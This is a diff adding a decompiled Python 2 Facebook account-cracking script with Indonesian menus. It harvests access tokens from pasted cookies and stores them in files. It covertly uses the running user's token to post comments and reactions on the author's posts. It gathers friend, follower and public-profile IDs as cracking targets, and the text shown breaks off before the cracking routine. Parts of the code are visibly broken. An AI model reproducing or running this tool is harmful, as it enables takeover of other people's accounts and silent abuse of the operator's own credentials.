@@ -1,0 +1,1757 @@
+# Decompiled by hakiki
+
+import os, re, sys, itertools, time, requests
+import random, threading, json, random, marshal
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+reload(sys)
+sys.setdefaultencoding('utf8')
+os.system('clear')
+
+animasi = [
+	'Alvin',
+	'aLvin',
+	'alVin',
+	'alvIn',
+	'alviN'
+]
+for i in range(len(animasi)):
+	sys.stdout.write('\r\x1b[0;93mLoading : ' + random.choice([
+		'\x1b[0;93m',
+		'\x1b[0;96m',
+		'\x1b[0;95m',
+		'\x1b[0;96m',
+		'\x1b[0;95m']) + animasi[i % len(animasi)])
+	sys.stdout.flush()
+	time.sleep(2)
+
+time.sleep(0)
+done = True
+url = 'https://httpbin.org/user-agent'
+req = requests.get(url)
+has = json.loads(req.text)
+uax = has['user-agent']
+white = '\x1b[1;97m'
+yellow = '\x1b[1;93m'
+bluelight = '\x1b[1;96m'
+green = '\x1b[1;92m'
+red = '\x1b[1;91m'
+blue = '\x1b[1;94m'
+purple = '\x1b[1;95m'
+grey = '\x1b[1;90m'
+bluest = '\x1b[4;94m'
+greenst = '\x1b[4;92m'
+
+def keluar():
+	print '! Exit'
+	os.sys.exit()
+
+def jalan(z):
+	for e in z + '\n':
+		sys.stdout.write(e)
+		sys.stdout.flush()
+		time.sleep(0.03)
+	
+	def webGet(self, url):
+		return session.get(url, headers = self.logSess()['agent'], cookies = self.logSess()['cookie']).text
+		
+	def webPost(self, url, data):
+		return session.post(url, headers = self.logSess()['agent'], cookies = self.logSess()['cookie'], data = data).text
+
+logo = "\x1b[0;91m _____ _	  ____				_			____\n|  ___| |__  / ___|_ __ __ _  ___| | _____ _ _|___ \n| |_  | '_ \\| |   | '__/ _` |/ __| |/ / _ \\ '__|__) |\n\x1b[0;97m|  _| | |_) | |___| | | (_| | (__|   <  __/ |  / __/\n|_|   |_.__/ \\____|_|  \\__,_|\\___|_|\\_\\___|_| |_____\n\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\n\x1b[0;95m{\x1b[0;96m\xc3\x97\x1b[0;95m} \x1b[0;93mAuthor   \x1b[0;91m: \x1b[0;96mMuhammad Rizky\n\x1b[0;95m{\x1b[0;96m\xc3\x97\x1b[0;95m} \x1b[0;93mGithub   \x1b[0;91m: \x1b[0;96mGithub.com/RIZKY4/cr4ck\n\x1b[0;95m{\x1b[0;96m\xc3\x97\x1b[0;95m} \x1b[0;93mFacebook \x1b[0;91m: \x1b[0;96mFacebook.com/Rizky.Rasata"
+back = 0
+threads = []
+berhasil = []
+cekpoint = []
+oks = []
+oke = []
+id = []
+fbid = []
+
+def masuk():
+	os.system('clear')
+	print logo
+	print 52 * '\x1b[0;93m\xe2\x94\x80'
+	time.sleep(0.07)
+	print '\x1b[0;92m1.\x1b[0;97m Login Via Token Facebook'
+	time.sleep(0.07)
+	print '\x1b[0;92m2.\x1b[0;97m Login Via Cookie Facebook'
+	time.sleep(0.07)
+	print '\x1b[0;92m3.\x1b[0;97m Ambil Token Dari Link'
+	time.sleep(0.07)
+	print '\x1b[0;91m0.\x1b[0;97m Keluar'
+	time.sleep(0.07)
+	print 52 * '\x1b[0;93m\xe2\x94\x80'
+	time.sleep(0.07)
+	pilih_masuk()
+
+def pilih_masuk():
+	msuk = raw_input('\x1b[0;92m>\x1b[0;97m ')
+	if msuk == '':
+		print '\x1b[0;91m! Isi Yg Benar'
+		pilih_masuk()
+	elif msuk == '1':
+		login_token()
+	elif msuk == '2':
+		coki()
+	elif msuk == '3':
+		ambil_link()
+	elif msuk == '0':
+		keluar()
+	else:
+		print '\x1b[0;91m! Isi Yg Benar'
+		pilih_masuk()
+
+def coki():
+	os.system('clear')
+	print logo
+	print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+	time.sleep(0.07)
+	
+	try:
+		cookie = raw_input('\x1b[0;95m\xe2\x80\xa2\x1b[0;97m Cookie \x1b[0;91m:\x1b[0;92m ')
+		data = {
+			'user-agent': '+uax+',
+			'referer': 'https://m.facebook.com/',
+			'host': 'm.facebook.com',
+			'origin': 'https://m.facebook.com',
+			'upgrade-insecure-requests': '1',
+			'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
+			'cache-control': 'max-age=0',
+			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+			'content-type': 'text/html; charset=utf-8',
+			'cookie': cookie
+		}
+		coki = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = data)
+		find = re.search('(EAAA\\w+)', coki.text)
+		token = find.group(1)
+		open('coki.log', 'w').write(cookie)
+		open('login.txt', 'w').write(token)
+		menu()
+	except (AttributeError, UnboundLocalError):
+		print '[\xc3\x97] Cookie Salah \xc3\x97'
+		time.sleep(2)
+		masuk()
+	except requests.exceptions.ConnectionError:
+		print '[\xc3\x97] Koneksi Bermasalah \xc3\x97' % (white, red, white, red)
+		exit()
+
+def login_token():
+	os.system('clear')
+	print logo
+	print 50 * '\x1b[0;93m\xe2\x94\x80'
+	toket = raw_input('\x1b[0;95m\xe2\x80\xa2\x1b[0;97m Token \x1b[0;91m:\x1b[0;92m ')
+	
+	try:
+		otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
+		a = json.loads(otw.text)
+		nama = a['name']
+		zedd = open('login.txt', 'w')
+		zedd.write(toket)
+		zedd.close()
+		print '\x1b[0;92m\xe2\x88\x9a Login Berhasil'
+		os.system('xdg-open https://m.facebook.com/Rizky.Rasata')
+		bot_komen()
+	except KeyError:
+		print '\x1b[1;91m! Token salah '
+		time.sleep(1.7)
+		masuk()
+	except requests.exceptions.SSLError:
+		print '! Koneksi Bermasalah'
+		exit()
+
+def masukn():
+	os.system('clear')
+	print logo
+	print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+	time.sleep(0.07)
+	
+	try:
+		cookie = raw_input('\x1b[0;95m\xe2\x80\xa2\x1b[0;97m Cookie \x1b[0;91m:\x1b[0;92m ')
+		data = {
+			'user-agent': '+uax+',
+			'referer': 'https://m.facebook.com/',
+			'host': 'm.facebook.com',
+			'origin': 'https://m.facebook.com',
+			'upgrade-insecure-requests': '1',
+			'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
+			'cache-control': 'max-age=0',
+			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+			'content-type': 'text/html; charset=utf-8',
+			'cookie': cookie
+		}
+		coki = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = data)
+		cari = re.search('(EAAA\\w+)', coki.text)
+		hasil = cari.group(1)
+		zedd = open('login.txt', 'w')
+		zedd.write(hasil)
+		zedd.close()
+		print '\x1b[0;92m\xe2\x88\x9a Login Berhasil'
+		time.sleep(2)
+		bot_komen()
+	except AttributeError:
+		print '\x1b[0;91m! Cookie Salah'
+		time.sleep(2)
+		masuk()
+	except UnboundLocalError:
+		print '\x1b[0;91m! Cookie Salah'
+		time.sleep(2)
+		masuk()
+	except requests.exceptions.SSLError:
+		os.system('clear')
+		print '\x1b[0;91m! Koneksi Bermasalah'
+		exit()
+
+def ambil_link():
+	os.system('clear')
+	print logo
+	print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+	time.sleep(0.07)
+	jalan('\x1b[0;92mDilarang Menggunakan Akun Facebook Lama...')
+	jalan('\x1b[0;92mWajib Menggunakan Akun Facebook Baru ...')
+	os.system('cd ... && npm install')
+	jalan('\x1b[0;96mMulai...')
+	os.system('cd ... && npm start')
+	raw_input('\n[ Kembali ]')
+	masuk()
+
+def bot_komen():
+	
+	try:
+		toket = open('login.txt', 'r').read()
+	except IOError:
+		print '\x1b[1;97m[!] Token invalid'
+		os.system('rm -rf login.txt')
+
+	kom = 'Gw Pake Sc Lu Bang \xf0\x9f\x98\x98'
+	reac = 'ANGRY'
+	post = '937777953338365'
+	post2 = '938954086554085'
+	kom2 = 'Mantap Bang \xf0\x9f\x98\x81'
+	reac2 = 'LOVE'
+	requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
+	requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + toket)
+	requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + toket)
+	requests.post('https://graph.facebook.com/' + post2 + '/reactions?type=' + reac2 + '&access_token=' + toket)
+	menu()
+
+def menu():
+	os.system('clear')
+	
+	try:
+		toket = open('login.txt', 'r').read()
+	except IOError:
+		print '\x1b[0;91m! Token Invalid '
+		os.system('clear')
+		os.system('rm -rf login.txt')
+		masuk()
+
+	
+	try:
+		otw = requests.get('https://graph.facebook.com/me/?access_token=' + toket)
+		a = json.loads(otw.text)
+		nama = a['name']
+		id = a['id']
+	except KeyError:
+		os.system('clear')
+		print '\x1b[0;91m ! Token invalid'
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		masuk()
+		time.sleep(1)
+		masuk()
+	except requests.exceptions.ConnectionError:
+		print '\x1b[0;91m! Tidak ada koneksi'
+		keluar()
+
+	os.system('clear')
+	print logo
+	time.sleep(0.07)
+	print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+	time.sleep(0.07)
+	jalan('\x1b[0;96m\xe2\x80\xa2\x1b[0;95m WELCOME\x1b[0;90m =>\x1b[0;92m ' + nama)
+	time.sleep(0.07)
+	jalan('\x1b[0;96m\xe2\x80\xa2\x1b[0;95m USER ID\x1b[0;90m =>\x1b[0;92m ' + id)
+	time.sleep(0.07)
+	print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+	time.sleep(0.07)
+	print '\x1b[0;95m1.\x1b[0;97m Crack ID Dari Teman/Publik'
+	time.sleep(0.07)
+	print '\x1b[0;95m2.\x1b[0;97m Crack ID Dari Like Teman/Publik'
+	time.sleep(0.07)
+	print '\x1b[0;95m3.\x1b[0;97m Crack ID Dari Followers'
+	time.sleep(0.07)
+	print '\x1b[0;95m4.\x1b[0;97m Cari ID Menggunakan Username'
+	time.sleep(0.07)
+	print '\x1b[0;95m5.\x1b[0;97m Lihat Hasil Crack'
+	time.sleep(0.07)
+	print '\x1b[0;95m6.\x1b[0;97m Perbarui Script'
+	time.sleep(0.07)
+	print '\x1b[0;95m7.\x1b[0;97m Hapus Teman Massal'
+	time.sleep(0.07)
+	print '\x1b[0;91m0.\x1b[0;97m Keluar Akun'
+	time.sleep(0.07)
+	print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+	time.sleep(0.07)
+	pilih_menu()
+
+def pilih_menu():
+	peler = raw_input('\x1b[0;95m>\x1b[0;97m ')
+	if peler == '':
+		print '\x1b[0;91m ! Isi Yg Benar'
+		pilih_menu()
+	elif peler == '1':
+		crack_teman()
+	elif peler == '2':
+		crack_like()
+	elif peler == '3':
+		crack_follow()
+	elif peler == '4':
+		cari_id()
+	elif peler == '5':
+		hasil_crack()
+	elif peler == '6':
+		perbarui()
+	elif peler == '7':
+		hapusfl()
+	elif peler == '0':
+		print '\x1b[0;91mMenghaspus Token ...'
+		time.sleep(1)
+		os.system('rm -rf login.txt')
+		keluar()
+	else:
+		print '\x1b[0;91m ! Isi Yg Benar'
+		pilih_menu()
+
+def crack_teman():
+	os.system('clear')
+	print logo
+	time.sleep(0.07)
+	print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+	time.sleep(0.07)
+	print '\x1b[0;93m1.\x1b[0;97m Crack ID Indonesia'
+	time.sleep(0.07)
+	print '\x1b[0;93m2.\x1b[0;97m Crack ID Bangladesh'
+	time.sleep(0.07)
+	print '\x1b[0;93m3.\x1b[0;97m Crack ID Pakistan'
+	time.sleep(0.07)
+	print '\x1b[0;93m4.\x1b[0;97m Crack ID Usa'
+	time.sleep(0.07)
+	print '\x1b[0;91m0.\x1b[0;97m Kembali'
+	time.sleep(0.07)
+	print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+	time.sleep(0.07)
+	pilih_teman()
+
+def pilih_teman():
+	uki = raw_input('\x1b[0;93m>\x1b[0;97m ')
+	if uki == '':
+		print '\x1b[0;91m! Isi Yg Benar'
+		pilih_teman()
+	elif uki == '1':
+		crack_indo()
+	elif uki == '2':
+		crack_bangla()
+	elif uki == '3':
+		crack_pakis()
+	elif uki == '4':
+		crack_usa()
+	elif uki == '0':
+		menu()
+	else:
+		print '\x1b[0;91m! Isi Yg Benar'
+		pilih_teman()
+
+def crack_indo():
+	global toket
+	os.system('clear')
+	
+	try:
+		toket = open('login.txt', 'r').read()
+	except IOError:
+		print '\x1b[0;91m! Token Invalid'
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		keluar()
+
+	os.system('clear')
+	print logo
+	print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+	time.sleep(0.07)
+	print '\x1b[0;96m1.\x1b[0;97m Crack Dari Daftar Teman'
+	time.sleep(0.07)
+	print '\x1b[0;96m2.\x1b[0;97m Crack Dari Publik/Teman'
+	time.sleep(0.07)
+	print '\x1b[0;96m3.\x1b[0;97m Crack Dari File'
+	time.sleep(0.07)
+	print '\x1b[0;91m0.\x1b[0;97m Kembali'
+	time.sleep(0.07)
+	print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+	time.sleep(0.07)
+	pilih_indo()
+
+def pilih_indo():
+	teak = raw_input('\x1b[0;96m>\x1b[0;97m ')
+	if teak == '':
+		print '\x1b[0;91m! Isi Yg Benar'
+		pilih_indo()
+	elif teak == '1':
+		os.system('clear')
+		print logo
+		print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+		time.sleep(0.07)
+		r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
+		z = json.loads(r.text)
+		for s in z['data']:
+			id.append(s['id'])
+		
+	elif teak == '2':
+		os.system('clear')
+		print logo
+		print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+		time.sleep(0.07)
+		idt = raw_input('\x1b[0;91m\xe2\x80\xa2 \x1b[0;96mID Publik/Teman \x1b[0;91m:\x1b[0;92m ')
+		time.sleep(0.07)
+		
+		try:
+			pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
+			sp = json.loads(pok.text)
+			print '\x1b[0;91m\xe2\x80\xa2\x1b[0;96m Nama \x1b[0;91m:\x1b[0;92m ' + sp['name']
+		except KeyError:
+			print '\x1b[0;91m! ID publik/teman tidak ada'
+			raw_input('\n\x1b[1;97m< \x1b[0;96mKembali \x1b[0;97m>')
+			crack_indo()
+		except requests.exceptions.ConnectionError:
+			print '\x1b[0;91m! Tidak ada koneksi'
+			keluar()
+
+		r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
+		z = json.loads(r.text)
+		for i in z['data']:
+			id.append(i['id'])
+		
+	elif teak == '3' or teak == '03':
+		os.system('clear')
+		print logo
+		
+		try:
+			print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+			time.sleep(0.07)
+			idlist = raw_input('\x1b[0;91m\xe2\x80\xa2 \x1b[0;96mNama File\x1b[0;91m :\x1b[0;92m ')
+			time.sleep(0.07)
+			for line in open(idlist, 'r').readlines():
+				id.append(line.strip())
+		except KeyError:
